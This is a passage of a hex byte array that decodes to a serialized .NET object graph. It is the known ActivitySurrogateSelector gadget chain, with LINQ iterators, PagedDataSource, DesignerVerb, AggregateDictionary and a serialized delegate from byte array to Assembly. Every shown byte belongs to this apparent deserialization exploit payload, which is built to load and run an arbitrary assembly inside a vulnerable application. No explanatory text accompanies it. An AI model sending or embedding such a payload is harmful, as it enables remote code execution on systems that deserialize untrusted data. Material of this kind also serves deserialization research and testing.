	0x4C, 0x6F, 0x61, 0x64, 0x46, 0x61, 0x63, 0x74, 0x6F, 0x72, 0x07, 0x56, 0x65, 0x72, 0x73, 0x69,
	0x6F, 0x6E, 0x08, 0x43, 0x6F, 0x6D, 0x70, 0x61, 0x72, 0x65, 0x72, 0x10, 0x48, 0x61, 0x73, 0x68,
	0x43, 0x6F, 0x64, 0x65, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x08, 0x48, 0x61, 0x73,
	0x68, 0x53, 0x69, 0x7A, 0x65, 0x04, 0x4B, 0x65, 0x79, 0x73, 0x06, 0x56, 0x61, 0x6C, 0x75, 0x65,
	0x73, 0x00, 0x00, 0x03, 0x03, 0x00, 0x05, 0x05, 0x0B, 0x08, 0x1C, 0x53, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x2E, 0x43, 0x6F, 0x6C, 0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x2E, 0x49, 0x43,
	0x6F, 0x6D, 0x70, 0x61, 0x72, 0x65, 0x72, 0x24, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x43,
	0x6F, 0x6C, 0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x2E, 0x49, 0x48, 0x61, 0x73, 0x68,
	0x43, 0x6F, 0x64, 0x65, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x08, 0xEC, 0x51, 0x38,
	0x3F, 0x02, 0x00, 0x00, 0x00, 0x0A, 0x0A, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x17, 0x00, 0x00, 0x00,
	0x09, 0x18, 0x00, 0x00, 0x00, 0x04, 0x0B, 0x00, 0x00, 0x00, 0x1F, 0x53, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x2E, 0x55, 0x6E, 0x69, 0x74, 0x79, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x61,
	0x74, 0x69, 0x6F, 0x6E, 0x48, 0x6F, 0x6C, 0x64, 0x65, 0x72, 0x03, 0x00, 0x00, 0x00, 0x04, 0x44,
	0x61, 0x74, 0x61, 0x09, 0x55, 0x6E, 0x69, 0x74, 0x79, 0x54, 0x79, 0x70, 0x65, 0x0C, 0x41, 0x73,
	0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x4E, 0x61, 0x6D, 0x65, 0x01, 0x00, 0x01, 0x08, 0x06, 0x19,
	0x00, 0x00, 0x00, 0xF8, 0x01, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x4C, 0x69, 0x6E, 0x71,
	0x2E, 0x45, 0x6E, 0x75, 0x6D, 0x65, 0x72, 0x61, 0x62, 0x6C, 0x65, 0x2B, 0x57, 0x68, 0x65, 0x72,
	0x65, 0x53, 0x65, 0x6C, 0x65, 0x63, 0x74, 0x4C, 0x69, 0x73, 0x74, 0x49, 0x74, 0x65, 0x72, 0x61,
	0x74, 0x6F, 0x72, 0x60, 0x32, 0x5B, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x42, 0x79,
	0x74, 0x65, 0x5B, 0x5D, 0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20,
	0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C,
	0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C,
	0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E,
	0x3D, 0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38,
	0x39, 0x5D, 0x2C, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52, 0x65, 0x66, 0x6C, 0x65,
	0x63, 0x74, 0x69, 0x6F, 0x6E, 0x2E, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x2C, 0x20,
	0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F,
	0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75,
	0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C,
	0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37, 0x61, 0x35,
	0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39, 0x5D, 0x5D, 0x04, 0x00, 0x00,
	0x00, 0x06, 0x1A, 0x00, 0x00, 0x00, 0x4E, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x43, 0x6F,
	0x72, 0x65, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x33, 0x2E, 0x35, 0x2E,
	0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75,
	0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54,
	0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33,
	0x34, 0x65, 0x30, 0x38, 0x39, 0x10, 0x0C, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x09, 0x1B,
	0x00, 0x00, 0x00, 0x0A, 0x09, 0x1C, 0x00, 0x00, 0x00, 0x09, 0x1D, 0x00, 0x00, 0x00, 0x08, 0x08,
	0x00, 0x00, 0x00, 0x00, 0x0A, 0x08, 0x08, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0D, 0x00, 0x00, 0x00,
	0x0B, 0x00, 0x00, 0x00, 0x06, 0x1E, 0x00, 0x00, 0x00, 0xF8, 0x01, 0x53, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x2E, 0x4C, 0x69, 0x6E, 0x71, 0x2E, 0x45, 0x6E, 0x75, 0x6D, 0x65, 0x72, 0x61, 0x62, 0x6C,
	0x65, 0x2B, 0x3C, 0x53, 0x65, 0x6C, 0x65, 0x63, 0x74, 0x4D, 0x61, 0x6E, 0x79, 0x49, 0x74, 0x65,
	0x72, 0x61, 0x74, 0x6F, 0x72, 0x3E, 0x64, 0x5F, 0x5F, 0x31, 0x34, 0x60, 0x32, 0x5B, 0x5B, 0x53,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52, 0x65, 0x66, 0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E,
	0x2E, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72,
	0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30,
	0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65,
	0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79,
	0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39,
	0x33, 0x34, 0x65, 0x30, 0x38, 0x39, 0x5D, 0x2C, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E,
	0x54, 0x79, 0x70, 0x65, 0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20,
	0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C,
	0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C,
	0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E,
	0x3D, 0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38,
	0x39, 0x5D, 0x5D, 0x04, 0x00, 0x00, 0x00, 0x09, 0x1A, 0x00, 0x00, 0x00, 0x10, 0x0E, 0x00, 0x00,
	0x00, 0x0B, 0x00, 0x00, 0x00, 0x0A, 0x08, 0x08, 0xFE, 0xFF, 0xFF, 0xFF, 0x08, 0x08, 0x01, 0x00,
	0x00, 0x00, 0x0A, 0x09, 0x03, 0x00, 0x00, 0x00, 0x0A, 0x09, 0x21, 0x00, 0x00, 0x00, 0x0D, 0x04,
	0x01, 0x0F, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x06, 0x22, 0x00, 0x00, 0x00, 0xEF, 0x01,
	0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x4C, 0x69, 0x6E, 0x71, 0x2E, 0x45, 0x6E, 0x75, 0x6D,
	0x65, 0x72, 0x61, 0x62, 0x6C, 0x65, 0x2B, 0x57, 0x68, 0x65, 0x72, 0x65, 0x53, 0x65, 0x6C, 0x65,
	0x63, 0x74, 0x45, 0x6E, 0x75, 0x6D, 0x65, 0x72, 0x61, 0x62, 0x6C, 0x65, 0x49, 0x74, 0x65, 0x72,
	0x61, 0x74, 0x6F, 0x72, 0x60, 0x32, 0x5B, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x54,
	0x79, 0x70, 0x65, 0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56,
	0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20,
	0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C,
	0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D,
	0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39,
	0x5D, 0x2C, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74,
	0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73,
	0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C,
	0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75,
	0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37,
	0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39, 0x5D, 0x5D, 0x04,
	0x00, 0x00, 0x00, 0x09, 0x1A, 0x00, 0x00, 0x00, 0x10, 0x10, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00,
	0x00, 0x09, 0x04, 0x00, 0x00, 0x00, 0x0A, 0x09, 0x25, 0x00, 0x00, 0x00, 0x0A, 0x08, 0x08, 0x00,
	0x00, 0x00, 0x00, 0x0A, 0x08, 0x08, 0x01, 0x00, 0x00, 0x00, 0x01, 0x11, 0x00, 0x00, 0x00, 0x0B,
	0x00, 0x00, 0x00, 0x06, 0x26, 0x00, 0x00, 0x00, 0x29, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E,
	0x57, 0x65, 0x62, 0x2E, 0x55, 0x49, 0x2E, 0x57, 0x65, 0x62, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F,
	0x6C, 0x73, 0x2E, 0x50, 0x61, 0x67, 0x65, 0x64, 0x44, 0x61, 0x74, 0x61, 0x53, 0x6F, 0x75, 0x72,
	0x63, 0x65, 0x04, 0x00, 0x00, 0x00, 0x06, 0x27, 0x00, 0x00, 0x00, 0x4D, 0x53, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x2E, 0x57, 0x65, 0x62, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D,
	0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65,
	0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63,
	0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x30, 0x33, 0x66, 0x35, 0x66, 0x37,
	0x66, 0x31, 0x31, 0x64, 0x35, 0x30, 0x61, 0x33, 0x61, 0x10, 0x12, 0x00, 0x00, 0x00, 0x07, 0x00,
	0x00, 0x00, 0x09, 0x05, 0x00, 0x00, 0x00, 0x08, 0x08, 0x00, 0x00, 0x00, 0x00, 0x08, 0x08, 0x0A,
	0x00, 0x00, 0x00, 0x08, 0x01, 0x00, 0x08, 0x01, 0x00, 0x08, 0x01, 0x00, 0x08, 0x08, 0x00, 0x00,
	0x00, 0x00, 0x01, 0x13, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x06, 0x29, 0x00, 0x00, 0x00,
	0x29, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E,
	0x74, 0x4D, 0x6F, 0x64, 0x65, 0x6C, 0x2E, 0x44, 0x65, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x44, 0x65,
	0x73, 0x69, 0x67, 0x6E, 0x65, 0x72, 0x56, 0x65, 0x72, 0x62, 0x04, 0x00, 0x00, 0x00, 0x06, 0x2A,
	0x00, 0x00, 0x00, 0x49, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73,
	0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C,
	0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75,
	0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37,
	0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39, 0x10, 0x14, 0x00,
	0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0D, 0x02, 0x09, 0x2B, 0x00, 0x00, 0x00, 0x08, 0x08, 0x03,
	0x00, 0x00, 0x00, 0x09, 0x08, 0x00, 0x00, 0x00, 0x01, 0x15, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00,
	0x00, 0x06, 0x2D, 0x00, 0x00, 0x00, 0x34, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52, 0x75,
	0x6E, 0x74, 0x69, 0x6D, 0x65, 0x2E, 0x52, 0x65, 0x6D, 0x6F, 0x74, 0x69, 0x6E, 0x67, 0x2E, 0x43,
	0x68, 0x61, 0x6E, 0x6E, 0x65, 0x6C, 0x73, 0x2E, 0x41, 0x67, 0x67, 0x72, 0x65, 0x67, 0x61, 0x74,
	0x65, 0x44, 0x69, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x61, 0x72, 0x79, 0x04, 0x00, 0x00, 0x00, 0x06,
	0x2E, 0x00, 0x00, 0x00, 0x4B, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56,
	0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20,
	0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C,
	0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D,
	0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39,
	0x10, 0x16, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x06, 0x00, 0x00, 0x00, 0x10, 0x17,
	0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x09, 0x07, 0x00, 0x00, 0x00, 0x09, 0x07, 0x00, 0x00,
	0x00, 0x10, 0x18, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x06, 0x31, 0x00, 0x00, 0x00, 0x05,
	0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x06, 0x32, 0x00, 0x00, 0x00, 0x06, 0x48, 0x65, 0x6C, 0x6C, 0x6F,
	0x32, 0x04, 0x1B, 0x00, 0x00, 0x00, 0x7F, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x43, 0x6F,
	0x6C, 0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x2E, 0x47, 0x65, 0x6E, 0x65, 0x72, 0x69,
	0x63, 0x2E, 0x4C, 0x69, 0x73, 0x74, 0x60, 0x31, 0x5B, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x2E, 0x42, 0x79, 0x74, 0x65, 0x5B, 0x5D, 0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69,
	0x62, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30,
	0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74,
	0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F,
	0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34,
	0x65, 0x30, 0x38, 0x39, 0x5D, 0x5D, 0x03, 0x00, 0x00, 0x00, 0x06, 0x5F, 0x69, 0x74, 0x65, 0x6D,
	0x73, 0x05, 0x5F, 0x73, 0x69, 0x7A, 0x65, 0x08, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E,
	0x03, 0x00, 0x00, 0x0F, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x42, 0x79, 0x74, 0x65, 0x5B,
	0x5D, 0x5B, 0x5D, 0x08, 0x08, 0x09, 0x33, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
	0x00, 0x00, 0x04, 0x1C, 0x00, 0x00, 0x00, 0x22, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44,
	0x65, 0x6C, 0x65, 0x67, 0x61, 0x74, 0x65, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x61,
	0x74, 0x69, 0x6F, 0x6E, 0x48, 0x6F, 0x6C, 0x64, 0x65, 0x72, 0x02, 0x00, 0x00, 0x00, 0x08, 0x44,
	0x65, 0x6C, 0x65, 0x67, 0x61, 0x74, 0x65, 0x07, 0x6D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x30, 0x03,
	0x03, 0x30, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x65, 0x6C, 0x65, 0x67, 0x61, 0x74,
	0x65, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x48, 0x6F,
	0x6C, 0x64, 0x65, 0x72, 0x2B, 0x44, 0x65, 0x6C, 0x65, 0x67, 0x61, 0x74, 0x65, 0x45, 0x6E, 0x74,
	0x72, 0x79, 0x2F, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52, 0x65, 0x66, 0x6C, 0x65, 0x63,
	0x74, 0x69, 0x6F, 0x6E, 0x2E, 0x4D, 0x65, 0x6D, 0x62, 0x65, 0x72, 0x49, 0x6E, 0x66, 0x6F, 0x53,
	0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x48, 0x6F, 0x6C, 0x64,
	0x65, 0x72, 0x09, 0x34, 0x00, 0x00, 0x00, 0x09, 0x35, 0x00, 0x00, 0x00, 0x04, 0x1D, 0x00, 0x00,
	0x00, 0x8A, 0x01, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x43, 0x6F, 0x6C, 0x6C, 0x65, 0x63,
	0x74, 0x69, 0x6F, 0x6E, 0x73, 0x2E, 0x47, 0x65, 0x6E, 0x65, 0x72, 0x69, 0x63, 0x2E, 0x4C, 0x69,
	0x73, 0x74, 0x60, 0x31, 0x2B, 0x45, 0x6E, 0x75, 0x6D, 0x65, 0x72, 0x61, 0x74, 0x6F, 0x72, 0x5B,
	0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x42, 0x79, 0x74, 0x65, 0x5B, 0x5D, 0x2C, 0x20,
	0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F,
	0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75,
	0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C,
	0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37, 0x61, 0x35,
	0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39, 0x5D, 0x5D, 0x04, 0x00, 0x00,
	0x00, 0x04, 0x6C, 0x69, 0x73, 0x74, 0x05, 0x69, 0x6E, 0x64, 0x65, 0x78, 0x07, 0x76, 0x65, 0x72,
	0x73, 0x69, 0x6F, 0x6E, 0x07, 0x63, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x03, 0x00, 0x00, 0x07,
	0x7F, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x43, 0x6F, 0x6C, 0x6C, 0x65, 0x63, 0x74, 0x69,
	0x6F, 0x6E, 0x73, 0x2E, 0x47, 0x65, 0x6E, 0x65, 0x72, 0x69, 0x63, 0x2E, 0x4C, 0x69, 0x73, 0x74,
	0x60, 0x31, 0x5B, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x42, 0x79, 0x74, 0x65, 0x5B,
	0x5D, 0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56, 0x65, 0x72,
	0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75,
	0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50,
	0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37,
	0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39, 0x5D, 0x5D,
	0x08, 0x08, 0x02, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x21, 0x00,
	0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x09, 0x36, 0x00, 0x00, 0x00, 0x09, 0x37, 0x00, 0x00, 0x00,
	0x01, 0x25, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x09, 0x38, 0x00, 0x00, 0x00, 0x09, 0x39,
	0x00, 0x00, 0x00, 0x01, 0x2B, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x09, 0x3A, 0x00, 0x00,
	0x00, 0x09, 0x3B, 0x00, 0x00, 0x00, 0x07, 0x33, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00,
	0x04, 0x00, 0x00, 0x00, 0x07, 0x02, 0x09, 0x3C, 0x00, 0x00, 0x00, 0x0A, 0x0A, 0x0A, 0x04, 0x34,
	0x00, 0x00, 0x00, 0x30, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x65, 0x6C, 0x65, 0x67,
	0x61, 0x74, 0x65, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x61, 0x74, 0x69, 0x6F, 0x6E,
	0x48, 0x6F, 0x6C, 0x64, 0x65, 0x72, 0x2B, 0x44, 0x65, 0x6C, 0x65, 0x67, 0x61, 0x74, 0x65, 0x45,
	0x6E, 0x74, 0x72, 0x79, 0x07, 0x00, 0x00, 0x00, 0x04, 0x74, 0x79, 0x70, 0x65, 0x08, 0x61, 0x73,
	0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x06, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x12, 0x74, 0x61,
	0x72, 0x67, 0x65, 0x74, 0x54, 0x79, 0x70, 0x65, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79,
	0x0E, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x54, 0x79, 0x70, 0x65, 0x4E, 0x61, 0x6D, 0x65, 0x0A,
	0x6D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x4E, 0x61, 0x6D, 0x65, 0x0D, 0x64, 0x65, 0x6C, 0x65, 0x67,
	0x61, 0x74, 0x65, 0x45, 0x6E, 0x74, 0x72, 0x79, 0x01, 0x01, 0x02, 0x01, 0x01, 0x01, 0x03, 0x30,
	0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x65, 0x6C, 0x65, 0x67, 0x61, 0x74, 0x65, 0x53,
	0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x48, 0x6F, 0x6C, 0x64,
	0x65, 0x72, 0x2B, 0x44, 0x65, 0x6C, 0x65, 0x67, 0x61, 0x74, 0x65, 0x45, 0x6E, 0x74, 0x72, 0x79,
	0x06, 0x3D, 0x00, 0x00, 0x00, 0xD5, 0x01, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x46, 0x75,
	0x6E, 0x63, 0x60, 0x32, 0x5B, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x42, 0x79, 0x74,
	0x65, 0x5B, 0x5D, 0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56,
	0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20,
